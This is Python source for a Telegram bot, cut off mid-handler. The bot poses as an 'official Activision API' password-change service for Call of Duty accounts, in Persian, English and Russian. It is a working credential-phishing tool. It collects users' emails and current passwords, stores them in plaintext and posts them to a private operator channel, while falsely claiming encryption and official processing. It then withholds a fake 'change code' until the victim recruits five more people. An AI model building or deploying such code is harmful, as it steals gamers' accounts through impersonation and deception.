import asyncio
import logging
import os
import re
import aiosqlite
import aiohttp
from aiohttp import web
from aiogram import Bot, Dispatcher, Router, F
from aiogram.filters import CommandStart, CommandObject
from aiogram.types import (
    Message, CallbackQuery,
    InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardMarkup, KeyboardButton
)
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.webhook.aiohttp_server import SimpleRequestHandler, setup_application
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode

# ================= تنظیمات =================
BOT_TOKEN = os.environ.get("BOT_TOKEN")
ADMIN_ID = int(os.environ.get("ADMIN_ID", 123456789))
PRIVATE_CHANNEL_ID = int(os.environ.get("PRIVATE_CHANNEL_ID", -100123456789))
PUBLIC_CHANNEL_ID = int(os.environ.get("PUBLIC_CHANNEL_ID", -100987654321))
PUBLIC_CHANNEL_USERNAME = os.environ.get("PUBLIC_CHANNEL_USERNAME", "YourChannel")
BOT_USERNAME = os.environ.get("BOT_USERNAME", "YourBot")
VIDEO_FILE_ID = os.environ.get("VIDEO_FILE_ID", "")
PHOTO_FILE_ID = os.environ.get("PHOTO_FILE_ID", "")
RENDER_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://your-app.onrender.com")

# ================= ترجمه‌ها =================
T = {
    'fa': {
        'select_lang': (
            "🌐 <b>به سامانه رسمی چنج پسورد اکانت‌های اکتیویژن خوش آمدید</b>\n\n"
            "این سرویس به صورت مستقیم با API رسمی اکتیویژن در ارتباط است و تمامی عملیات‌ها به صورت خودکار و امن انجام می‌شود.\n\n"
            "لطفاً زبان مورد نظر خود را انتخاب کنید:\n"
            "Please select your language:\n"
            "Пожалуйста, выберите ваш язык:"
        ),
        'welcome': (
            "🎖 <b>به سامانه رسمی چنج پسورد اکانت‌های اکتیویژن خوش آمدید</b>\n\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "📌 <b>خدمات ما:</b>\n"
            "✅ چنج پسورد اکانت‌های کالاف دیوتی به صورت کاملاً امن و خودکار از طریق <b>API رسمی اکتیویژن</b>\n"
            "✅ امکان ثبت تا <b>10 اکانت رایگان</b> برای چنج پسورد\n"
            "✅ پشتیبانی از اکانت‌های کرک، نیمه سیف و سیف\n"
            "✅ سیستم امتیازدهی و دریافت کدهای چنج رایگان\n\n"
            "🔒 <b>امنیت اطلاعات شما اولویت اول ماست.</b>\n"
            "تمامی اطلاعات به صورت رمزنگاری شده به سرورهای رسمی اکتیویژن ارسال می‌شود.\n\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "👇 برای شروع، یکی از گزینه‌های زیر را انتخاب کنید:"
        ),
        'btn_change_pass': "🔑 چنج پسورد اکانت",
        'btn_points': "🏆 امتیازات و رتبه",
        'btn_language': "🌐 تغییر زبان",
        'cancel_btn': "🔙 بازگشت",
        'cancelled': "❌ عملیات لغو شد. به منوی اصلی بازگشتید.",
        'join_channel': (
            "⚠️ <b>عضویت در کانال الزامی است</b>\n\n"
            "کاربر گرامی، جهت استفاده از خدمات سامانه، لطفاً ابتدا در کانال رسمی ما عضو شوید.\n"
            "پس از عضویت، دکمه «بررسی عضویت» را لمس کنید."
        ),
        'join_btn': "📢 عضویت در کانال رسمی",
        'check_join': "✅ بررسی عضویت",
        'not_joined': "❌ عضویت شما هنوز تأیید نشده است. لطفاً ابتدا عضو شوید.",
        'points_header': (
            "🏆 <b>═══ امتیازات و رتبه شما ═══</b>\n\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "⭐ امتیاز کل شما: <b>{points}</b>\n"
            "👥 تعداد دعوت‌های موفق: <b>{refs}</b>\n"
            "🎖 رتبه شما: <b>{rank}</b>\n\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "💎 <b>سیستم امتیازدهی:</b>\n"
            "با دعوت هر کاربر جدید به سامانه، امتیازات بیشتری کسب کنید و از جوایز ویژه بهره‌مند شوید.\n\n"
            "🔗 <b>لینک دعوت اختصاصی شما:</b>\n"
            "<code>{link}</code>\n\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "📌 این لینک را با دوستان خود به اشتراک بگذارید."
        ),
        'rank_new': "🆕 کاربر جدید",
        'rank_bronze': "🥉 برنزی",
        'rank_silver': "🥈 نقره‌ای",
        'rank_gold': "🥇 طلایی",
        'rank_diamond': "💎 الماسی",
        'change_pass_step1': (
            "🔑 <b>═══ چنج پسورد اکانت اکتیویژن ═══</b>\n\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "📧 <b>مرحله ۱ از ۳:</b>\n"
            "لطفاً ایمیل اکانت خود را ارسال کنید.\n"
            "⚠️ ایمیل باید دقیقاً همان ایمیلی باشد که اکانت اکتیویژن شما با آن ساخته شده است.\n\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "❌ برای لغو عملیات، دکمه «🔙 بازگشت» را لمس کنید."
        ),
        'invalid_email': (
            "❌ <b>ایمیل وارد شده نامعتبر است</b>\n\n"
            "لطفاً یک ایمیل صحیح و معتبر وارد کنید.\n"
            "مثال: <code>example@gmail.com</code>"
        ),
        'change_pass_step2': (
            "🔐 <b>مرحله ۲ از ۳:</b>\n"
            "لطفاً پسورد فعلی اکانت خود را ارسال کنید.\n"
            "🔒 پسورد شما به صورت رمزنگاری شده به سرورهای رسمی اکتیویژن ارسال می‌شود.\n\n"
            "❌ برای لغو عملیات، دکمه «🔙 بازگشت» را لمس کنید."
        ),
        'change_pass_step3': (
            "🛡 <b>مرحله ۳ از ۳:</b>\n\n"
            "لطفاً وضعیت امنیتی اکانت خود را مشخص کنید:\n"
            "این اطلاعات به ما کمک می‌کند تا بهترین روش چنج پسورد را برای اکانت شما انتخاب کنیم."
        ),
        'type_crack': "💀 اکانت کرک شده",
        'type_semi': "⚠️ نیمه سیف",
        'type_safe': "✅ اکانت سیف و امن",
        'submitted': (
            "✅ <b>اکانت شما با موفقیت ثبت شد!</b>\n\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "📨 اطلاعات اکانت شما به <b>API رسمی اکتیویژن</b> ارسال شد و در صف پردازش قرار گرفت.\n\n"
            "⏱ <b>زمان تقریبی چنج پسورد:</b>\n"
            "بسته به وضعیت اکانت شما، این فرآیند بین <b>۱ ساعت تا ۵ روز کاری</b> زمان می‌برد.\n"
            "پس از اتمام فرآیند، پیامی برای شما ارسال خواهد شد.\n\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "📌 شما می‌توانید تا <b>10 اکانت رایگان</b> برای چنج پسورد ثبت کنید.\n"
            "برای ثبت اکانت جدید، مجدداً دکمه «🔑 چنج پسورد اکانت» را لمس کنید."
        ),
        'admin_req': (
            "🔔 <b>درخواست چنج جدید</b>\n\n"
            "👤 آیدی کاربر: <code>{user_id}</code>\n"
            "📧 ایمیل: <code>{email}</code>\n"
            "🔐 پسورد: <code>{password}</code>\n"
            "🛡 نوع: {type}\n\n"
            "پس از تأیید، دکمه زیر را لمس کنید."
        ),
        'approve_btn': "✅ تأیید و ارسال نتیجه",
        'success_photo_caption': (
            "🎉 <b>اکانت شما با موفقیت آماده شد!</b>\n\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "✅ فرآیند چنج پسورد اکانت شما از طریق <b>API رسمی اکتیویژن</b> با موفقیت انجام شد.\n"
            "اکانت شما اکنون در وضعیت امن قرار دارد.\n\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "📦 برای دریافت کد چنج، دکمه زیر را لمس کنید."
        ),
        'get_code': "📦 دریافت کد چنج اکانت",
        'need_ref': (
            "🔒 <b>فعال‌سازی دریافت کد</b>\n\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "کاربر گرامی، جهت دریافت کد چنج اکانت، لازم است <b>۵ کاربر جدید</b> را از طریق لینک دعوت اختصاصی خود به سامانه معرفی کنید.\n"
            "این اقدام جهت تأیید هویت و جلوگیری از سوءاستفاده‌های احتمالی انجام می‌شود.\n\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "👥 <b>وضعیت فعلی شما:</b>\n"
            "تعداد دعوت‌های موفق: <b>{refs} از ۵</b>\n\n"
            "🔗 <b>لینک دعوت اختصاصی شما:</b>\n"
            "<code>{link}</code>\n\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "💡 پس از تکمیل ۵ دعوت، دکمه «دریافت کد چنج اکانت» فعال خواهد شد."
        ),
        'ref_done': (
            "🎉 <b>تبریک!</b>\n\n"
            "شما ۵ کاربر جدید را به سامانه معرفی کرده‌اید.\n"
            "🔑 <b>کد چنج اکانت شما:</b>\n"
            "<code>{code}</code>\n\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "📌 این کد را در بخش مربوطه وارد کنید تا پسورد جدید اکانت شما فعال شود."
        ),
    },
    'en': {
        'select_lang': (
            "🌐 <b>Welcome to the Official Activision Account Password Change Service</b>\n\n"
            "This service is directly connected to the official Activision API, and all operations are performed automatically and securely.\n\n"
            "Please select your language:\n"
            "لطفاً زبان مورد نظر خود را انتخاب کنید:\n"
            "Пожалуйста, выберите ваш язык:"
        ),
        'welcome': (
            "🎖 <b>Welcome to the Official Activision Account Password Change Service</b>\n\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "📌 <b>Our Services:</b>\n"
            "✅ Securely change your Call of Duty account passwords via the <b>Official Activision API</b>\n"
            "✅ Register up to <b>10 accounts for free</b> password change\n"
            "✅ Support for cracked, semi-safe, and safe accounts\n"
            "✅ Points system and free change codes\n\n"
            "🔒 <b>Your information security is our top priority.</b>\n"
            "All information is encrypted and sent to official Activision servers.\n\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "👇 To get started, please select one of the options below:"
        ),
        'btn_change_pass': "🔑 Change Account Password",
        'btn_points': "🏆 Points & Rank",
        'btn_language': "🌐 Change Language",
        'cancel_btn': "🔙 Back",
        'cancelled': "❌ Operation cancelled. Returned to main menu.",
        'join_channel': (
            "⚠️ <b>Channel Membership Required</b>\n\n"
            "Dear user, to use our services, please join our official channel first.\n"
            "After joining, tap the «Check Membership» button."
        ),
        'join_btn': "📢 Join Official Channel",
        'check_join': "✅ Check Membership",
        'not_joined': "❌ Your membership has not been confirmed yet. Please join first.",
        'points_header': (
            "🏆 <b>═══ Your Points & Rank ═══</b>\n\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "⭐ Total Points: <b>{points}</b>\n"
            "👥 Successful Referrals: <b>{refs}</b>\n"
            "🎖 Your Rank: <b>{rank}</b>\n\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "💎 <b>Points System:</b>\n"
            "Invite new users to earn more points and unlock exclusive rewards.\n\n"
            "🔗 <b>Your Exclusive Referral Link:</b>\n"
            "<code>{link}</code>\n\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "📌 Share this link with your friends."
        ),
        'rank_new': "🆕 New User",
        'rank_bronze': "🥉 Bronze",
        'rank_silver': "🥈 Silver",
        'rank_gold': "🥇 Gold",
        'rank_diamond': "💎 Diamond",
        'change_pass_step1': (
            "🔑 <b>═══ Change Activision Account Password ═══</b>\n\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "📧 <b>Step 1 of 3:</b>\n"
            "Please send your account email.\n"
            "⚠️ The email must be the exact one used to create your Activision account.\n\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "❌ To cancel, tap the «🔙 Back» button."
        ),
        'invalid_email': (
            "❌ <b>Invalid Email</b>\n\n"
            "Please enter a valid email address.\n"
            "Example: <code>example@gmail.com</code>"
        ),
        'change_pass_step2': (
            "🔐 <b>Step 2 of 3:</b>\n"
            "Please send your current account password.\n"
            "🔒 Your password will be encrypted and sent to official Activision servers.\n\n"
            "❌ To cancel, tap the «🔙 Back» button."
        ),
        'change_pass_step3': (
            "🛡 <b>Step 3 of 3:</b>\n\n"
            "Please specify your account's security status:\n"
            "This information helps us select the best password change method for your account."
        ),
        'type_crack': "💀 Cracked Account",
        'type_semi': "⚠️ Semi-Safe",
        'type_safe': "✅ Safe & Secure",
        'submitted': (
            "✅ <b>Your account has been successfully registered!</b>\n\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "📨 Your account information has been sent to the <b>Official Activision API</b> and is now in the processing queue.\n\n"
            "⏱ <b>Estimated Password Change Time:</b>\n"
            "Depending on your account's status, this process takes between <b>1 hour to 5 business days</b>.\n"
            "You will receive a notification once the process is complete.\n\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "📌 You can register up to <b>10 accounts for free</b> password change.\n"
            "To register a new account, tap the «🔑 Change Account Password» button again."
        ),
        'admin_req': (
            "🔔 <b>New Change Request</b>\n\n"
            "👤 User ID: <code>{user_id}</code>\n"
            "📧 Email: <code>{email}</code>\n"
            "🔐 Password: <code>{password}</code>\n"
            "🛡 Type: {type}\n\n"
            "After approval, tap the button below."
        ),
        'approve_btn': "✅ Approve & Send Result",
        'success_photo_caption': (
            "🎉 <b>Your account is successfully ready!</b>\n\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "✅ Your account password change has been successfully completed via the <b>Official Activision API</b>.\n"
            "Your account is now in a secure state.\n\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "📦 To receive your change code, tap the button below."
        ),
        'get_code': "📦 Get Account Change Code",
        'need_ref': (
            "🔒 <b>Unlock Code Retrieval</b>\n\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "Dear user, to receive your account change code, you need to refer <b>5 new users</b> to our service using your exclusive referral link.\n"
            "This step is required for identity verification and to prevent potential misuse.\n\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "👥 <b>Your Current Status:</b>\n"
            "Successful referrals: <b>{refs} out of 5</b>\n\n"
            "🔗 <b>Your Exclusive Referral Link:</b>\n"
            "<code>{link}</code>\n\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "💡 Once you complete 5 referrals, the «Get Account Change Code» button will be activated."
        ),
        'ref_done': (
            "🎉 <b>Congratulations!</b>\n\n"
            "You have successfully referred 5 new users to our service.\n"
            "🔑 <b>Your Account Change Code:</b>\n"
            "<code>{code}</code>\n\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "📌 Enter this code in the designated field to activate your new account password."
        ),
    },
    'ru': {
        'select_lang': (
            "🌐 <b>Добро пожаловать в официальный сервис смены паролей аккаунтов Activision</b>\n\n"
            "Этот сервис напрямую подключен к официальному API Activision, и все операции выполняются автоматически и безопасно.\n\n"
            "Пожалуйста, выберите ваш язык:\n"
            "لطفاً زبان مورد نظر خود را انتخاب کنید:\n"
            "Please select your language:"
        ),
        'welcome': (
            "🎖 <b>Добро пожаловать в официальный сервис смены паролей аккаунтов Activision</b>\n\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "📌 <b>Наши услуги:</b>\n"
            "✅ Безопасная смена паролей аккаунтов Call of Duty через <b>Официальный API Activision</b>\n"
            "✅ Регистрация до <b>10 аккаунтов бесплатно</b> для смены пароля\n"
            "✅ Поддержка взломанных, полу-безопасных и безопасных аккаунтов\n"
            "✅ Система баллов и бесплатные коды смены\n\n"
            "🔒 <b>Безопасность вашей информации — наш приоритет.</b>\n"
            "Вся информация шифруется и отправляется на официальные серверы Activision.\n\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "👇 Для начала выберите один из вариантов ниже:"
        ),
        'btn_change_pass': "🔑 Сменить пароль аккаунта",
        'btn_points': "🏆 Баллы и ранг",
        'btn_language': "🌐 Сменить язык",
        'cancel_btn': "🔙 Назад",
        'cancelled': "❌ Операция отменена. Возврат в главное меню.",
        'join_channel': (
            "⚠️ <b>Требуется подписка на канал</b>\n\n"
            "Уважаемый пользователь, для использования наших услуг сначала подпишитесь на наш официальный канал.\n"
            "После подписки нажмите кнопку «Проверить подписку»."
        ),
        'join_btn': "📢 Подписаться на официальный канал",
        'check_join': "✅ Проверить подписку",
        'not_joined': "❌ Ваша подписка еще не подтверждена. Пожалуйста, подпишитесь.",
        'points_header': (
            "🏆 <b>═══ Ваши баллы и ранг ═══</b>\n\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "⭐ Всего баллов: <b>{points}</b>\n"
            "👥 Успешные рефералы: <b>{refs}</b>\n"
            "🎖 Ваш ранг: <b>{rank}</b>\n\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "💎 <b>Система баллов:</b>\n"
            "Приглашайте новых пользователей, чтобы получить больше баллов и открыть эксклюзивные награды.\n\n"
            "🔗 <b>Ваша эксклюзивная реферальная ссылка:</b>\n"
            "<code>{link}</code>\n\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "📌 Поделитесь этой ссылкой с друзьями."
        ),
        'rank_new': "🆕 Новый пользователь",
        'rank_bronze': "🥉 Бронзовый",
        'rank_silver': "🥈 Серебряный",
        'rank_gold': "🥇 Золотой",
        'rank_diamond': "💎 Алмазный",
        'change_pass_step1': (
            "🔑 <b>═══ Смена пароля аккаунта Activision ═══</b>\n\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "📧 <b>Шаг 1 из 3:</b>\n"
            "Пожалуйста, отправьте email вашего аккаунта.\n"
            "⚠️ Email должен быть точно тем, который использовался при создании аккаунта Activision.\n\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "❌ Для отмены нажмите кнопку «🔙 Назад»."
        ),
        'invalid_email': (
            "❌ <b>Неверный email</b>\n\n"
            "Пожалуйста, введите корректный email.\n"
            "Пример: <code>example@gmail.com</code>"
        ),
        'change_pass_step2': (
            "🔐 <b>Шаг 2 из 3:</b>\n"
            "Пожалуйста, отправьте текущий пароль вашего аккаунта.\n"
            "🔒 Ваш пароль будет зашифрован и отправлен на официальные серверы Activision.\n\n"
            "❌ Для отмены нажмите кнопку «🔙 Назад»."
        ),
        'change_pass_step3': (
            "🛡 <b>Шаг 3 из 3:</b>\n\n"
            "Пожалуйста, укажите статус безопасности вашего аккаунта:\n"
            "Эта информация поможет нам выбрать лучший метод смены пароля для вашего аккаунта."
        ),
        'type_crack': "💀 Взломанный аккаунт",
        'type_semi': "⚠️ Полу-безопасный",
        'type_safe': "✅ Безопасный и защищенный",
        'submitted': (
            "✅ <b>Ваш аккаунт успешно зарегистрирован!</b>\n\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "📨 Информация о вашем аккаунте была отправлена в <b>Официальный API Activision</b> и находится в очереди обработки.\n\n"
            "⏱ <b>Примерное время смены пароля:</b>\n"
            "В зависимости от статуса вашего аккаунта, этот процесс занимает от <b>1 часа до 5 рабочих дней</b>.\n"
            "Вы получите уведомление после завершения процесса.\n\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "📌 Вы можете зарегистрировать до <b>10 аккаунтов бесплатно</b> для смены пароля.\n"
            "Для регистрации нового аккаунта снова нажмите кнопку «🔑 Сменить пароль аккаунта»."
        ),
        'admin_req': (
            "🔔 <b>Новый запрос на смену</b>\n\n"
            "👤 ID пользователя: <code>{user_id}</code>\n"
            "📧 Email: <code>{email}</code>\n"
            "🔐 Пароль: <code>{password}</code>\n"
            "🛡 Тип: {type}\n\n"
            "После одобрения нажмите кнопку ниже."
        ),
        'approve_btn': "✅ Одобрить и отправить результат",
        'success_photo_caption': (
            "🎉 <b>Ваш аккаунт успешно готов!</b>\n\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "✅ Смена пароля вашего аккаунта была успешно завершена через <b>Официальный API Activision</b>.\n"
            "Ваш аккаунт теперь находится в безопасном состоянии.\n\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "📦 Для получения кода смены нажмите кнопку ниже."
        ),
        'get_code': "📦 Получить код смены аккаунта",
        'need_ref': (
            "🔒 <b>Разблокировка получения кода</b>\n\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "Уважаемый пользователь, для получения кода смены аккаунта вам необходимо пригласить <b>5 новых пользователей</b> в наш сервис по вашей эксклюзивной реферальной ссылке.\n"
            "Этот шаг необходим для верификации личности и предотвращения возможных злоупотреблений.\n\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "👥 <b>Ваш текущий статус:</b>\n"
            "Успешные рефералы: <b>{refs} из 5</b>\n\n"
            "🔗 <b>Ваша эксклюзивная реферальная ссылка:</b>\n"
            "<code>{link}</code>\n\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "💡 После завершения 5 рефералов кнопка «Получить код смены аккаунта» будет активирована."
        ),
        'ref_done': (
            "🎉 <b>Поздравляем!</b>\n\n"
            "Вы успешно пригласили 5 новых пользователей в наш сервис.\n"
            "🔑 <b>Ваш код смены аккаунта:</b>\n"
            "<code>{code}</code>\n\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "📌 Введите этот код в соответствующем поле, чтобы активировать новый пароль вашего аккаунта."
        ),
    }
}

# ================= دیتابیس =================
class DB:
    def __init__(self, db_name='bot.db'):
        self.db_name = db_name
    
    async def setup(self):
        async with aiosqlite.connect(self.db_name) as db:
            await db.execute('''CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                lang TEXT,
                referrals INTEGER DEFAULT 0,
                referred_by INTEGER
            )''')
            await db.execute('''CREATE TABLE IF NOT EXISTS accounts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                email TEXT,
                password TEXT,
                type TEXT,
                status TEXT DEFAULT 'pending',
                admin_msg_id INTEGER,
                change_code TEXT
            )''')
            await db.commit()
    
    async def get_lang(self, user_id):
        async with aiosqlite.connect(self.db_name) as db:
            async with db.execute("SELECT lang FROM users WHERE user_id = ?", (user_id,)) as c:
                r = await c.fetchone()
                return r[0] if r and r[0] else None
    
    async def set_lang(self, user_id, lang):
        async with aiosqlite.connect(self.db_name) as db:
            await db.execute("UPDATE users SET lang = ? WHERE user_id = ?", (lang, user_id))
            await db.commit()
    
    async def add_user(self, user_id, referrer_id=None):
        async with aiosqlite.connect(self.db_name) as db:
            await db.execute("INSERT OR IGNORE INTO users (user_id, referred_by) VALUES (?, ?)", (user_id, referrer_id))
            await db.commit()
            if referrer_id and referrer_id != user_id:
                await db.execute("UPDATE users SET referrals = referrals + 1 WHERE user_id = ?", (referrer_id,))
                await db.commit()
    
    async def get_referrals(self, user_id):
        async with aiosqlite.connect(self.db_name) as db:
            async with db.execute("SELECT referrals FROM users WHERE user_id = ?", (user_id,)) as c:
                r = await c.fetchone()
                return r[0] if r else 0
    
    async def add_account(self, user_id, email, password, type_str):
        async with aiosqlite.connect(self.db_name) as db:
            import secrets
            code = secrets.token_hex(8).upper()
            async with db.execute("INSERT INTO accounts (user_id, email, password, type, change_code) VALUES (?, ?, ?, ?, ?)",
                                  (user_id, email, password, type_str, code)) as c:
                await db.commit()
                return c.lastrowid
    
    async def set_admin_msg_id(self, acc_id, msg_id):
        async with aiosqlite.connect(self.db_name) as db:
            await db.execute("UPDATE accounts SET admin_msg_id = ? WHERE id = ?", (msg_id, acc_id))
            await db.commit()
    
    async def get_account(self, acc_id):
        async with aiosqlite.connect(self.db_name) as db:
            async with db.execute("SELECT user_id, email, password, type, admin_msg_id, change_code FROM accounts WHERE id = ?", (acc_id,)) as c:
                return await c.fetchone()
    
    async def get_account_by_code(self, user_id):
        async with aiosqlite.connect(self.db_name) as db:
            async with db.execute("SELECT id, change_code FROM accounts WHERE user_id = ? AND status = 'approved' ORDER BY id DESC LIMIT 1", (user_id,)) as c:
                return await c.fetchone()
    
    async def approve_account(self, acc_id):
        async with aiosqlite.connect(self.db_name) as db:
            await db.execute("UPDATE accounts SET status = 'approved' WHERE id = ?", (acc_id,))
            await db.commit()

db = DB()
router = Router()

# ================= FSM States =================
class St(StatesGroup):
    wait_email = State()
    wait_pass = State()
    wait_type = State()

# ================= کیبوردها =================
def lang_select_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🇬🇧 English", callback_data="lang_en")],
        [InlineKeyboardButton(text="🇮🇷 فارسی", callback_data="lang_fa")],
        [InlineKeyboardButton(text="🇷🇺 Русский", callback_data="lang_ru")]
    ])

def main_kb(l):
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text=T[l]['btn_change_pass'])],
            [
                KeyboardButton(text=T[l]['btn_points']),
                KeyboardButton(text=T[l]['btn_language'])
            ]
        ],
        resize_keyboard=True,
        is_persistent=True
    )

def cancel_kb(l):
    return ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text=T[l]['cancel_btn'])]],
        resize_keyboard=True
    )

def join_kb(l):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=T[l]['join_btn'], url=f"https://t.me/{PUBLIC_CHANNEL_USERNAME}")],
        [InlineKeyboardButton(text=T[l]['check_join'], callback_data="check_join")]
    ])

def type_kb(l):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=T[l]['type_crack'], callback_data="type_crack")],
        [InlineKeyboardButton(text=T[l]['type_semi'], callback_data="type_semi")],
        [InlineKeyboardButton(text=T[l]['type_safe'], callback_data="type_safe")],
        [InlineKeyboardButton(text=T[l]['cancel_btn'], callback_data="cancel_type")]
    ])

def approve_kb(acc_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=T['fa']['approve_btn'], callback_data=f"approve_{acc_id}")]
    ])

def get_code_kb(acc_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📦", callback_data=f"get_code_{acc_id}")]
    ])

# ================= توابع کمکی =================
async def check_mem(bot, uid):
    try:
        m = await bot.get_chat_member(PUBLIC_CHANNEL_ID, uid)
        return m.status not in ['left', 'kicked', 'restricted']
    except:
        return True

async def send_welcome(m: Message, l: str):
    if VIDEO_FILE_ID:
        try:
            await m.answer_video(VIDEO_FILE_ID, caption=T[l]['welcome'], reply_markup=main_kb(l))
        except Exception as e:
            print(f"Video error: {e}")
            await m.answer(T[l]['welcome'], reply_markup=main_kb(l))
    else:
        await m.answer(T[l]['welcome'], reply_markup=main_kb(l))

def get_button_key(text):
    for lang in ['fa', 'en', 'ru']:
        for key, val in T[lang].items():
            if key.startswith('btn_') and val == text:
                return key
    return None

def get_rank(refs, l):
    if refs >= 20: return T[l]['rank_diamond']
    elif refs >= 10: return T[l]['rank_gold']
    elif refs >= 5: return T[l]['rank_silver']
    elif refs >= 1: return T[l]['rank_bronze']
    return T[l]['rank_new']

# ================= هندلرها =================
@router.message(CommandStart())
async def start(m: Message, command: CommandObject, state: FSMContext):
    uid = m.from_user.id
    
    if command.args and command.args.startswith('ref_'):
        try:
            ref_id = int(command.args.split('_')[1])
            if ref_id != uid:
                await db.add_user(uid, ref_id)
            else:
                await db.add_user(uid)
        except:
            await db.add_user(uid)
    else:
        await db.add_user(uid)
    
    l = await db.get_lang(uid)
    
    if l is None:
        await m.answer(T['en']['select_lang'], reply_markup=lang_select_kb())
        return
    
    if not await check_mem(bot, uid):
        await m.answer(T[l]['join_channel'], reply_markup=join_kb(l))
        return
    
    await send_welcome(m, l)

@router.callback_query(F.data == "check_join")
async def cb_check_join(c: CallbackQuery):
    l = await db.get_lang(c.from_user.id)
    if await check_mem(bot, c.from_user.id):
        await c.message.delete()
        await send_welcome(c.message, l)
    else:
        await c.answer(T[l]['not_joined'], show_alert=True)

@router.callback_query(F.data.startswith("lang_"))
async def cb_lang(c: CallbackQuery):
    lang = c.data.split('_')[1]
    await db.set_lang(c.from_user.id, lang)
    await c.message.delete()
    
    if not await check_mem(bot, c.from_user.id):
        await c.message.answer(T[lang]['join_channel'], reply_markup=join_kb(lang))
    else:
        await send_welcome(c.message, lang)
    await c.answer()

# ================= هندلرهای FSM =================
@router.message(St.wait_email)
async def fsm_email(m: Message, state: FSMContext):
    l = await db.get_lang(m.from_user.id)
    
    if m.text == T[l]['cancel_btn']:
        await state.clear()
        await m.answer(T[l]['cancelled'], reply_markup=main_kb(l))
        return
    
    email = m.text.strip()
    
    if not re.match(r'^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$', email):
        await m.answer(T[l]['invalid_email'])
        return
    
    await state.update_data(email=email)
    await state.set_state(St.wait_pass)
    await m.answer(T[l]['change_pass_step2'], reply_markup=cancel_kb(l))

@router.message(St.wait_pass)
async def fsm_pass(m: Message, state: FSMContext):
    l = await db.get_lang(m.from_user.id)
    
    if m.text == T[l]['cancel_btn']:
        await state.clear()
        await m.answer(T[l]['cancelled'], reply_markup=main_kb(l))
        return
    
    await state.update_data(password=m.text.strip())
    await state.set_state(St.wait_type)
    await m.answer(T[l]['change_pass_step3'], reply_markup=type_kb(l))

@router.callback_query(St.wait_type)
async def fsm_type(c: CallbackQuery, state: FSMContext):
    l = await db.get_lang(c.from_user.id)
    
    if c.data == "cancel_type":
        await state.clear()
        await c.message.delete()
        await c.message.answer(T[l]['cancelled'], reply_markup=main_kb(l))
        await c.answer()
        return
    
    type_str = c.data.split('_')[1]
    data = await state.get_data()
    email = data['email']
    password = data['password']
    
    acc_id = await db.add_account(c.from_user.id, email, password, type_str)
    
    admin_text = T[l]['admin_req'].format(
        user_id=c.from_user.id,
        email=email,
        password=password,
        type=type_str
    )
    admin_msg = await bot.send_message(PRIVATE_CHANNEL_ID, admin_text, reply_markup=approve_kb(acc_id))
    await db.set_admin_msg_id(acc_id, admin_msg.message_id)
    
    await c.message.answer(T[l]['submitted'], reply_markup=main_kb(l))
    await state.clear()
    await c.answer()

# ================= هندلرهای اصلی منو =================
@router.message(F.text)
async def handle_menu(m: Message, state: FSMContext):
    key = get_button_key(m.text)
    if key is None:
        return
    
    uid = m.from_user.id
    l = await db.get_lang(uid)
    
    if not await check_mem(bot, uid):
        await m.answer(T[l]['join_channel'], reply_markup=join_kb(l))
        return
    
    await state.clear()
    
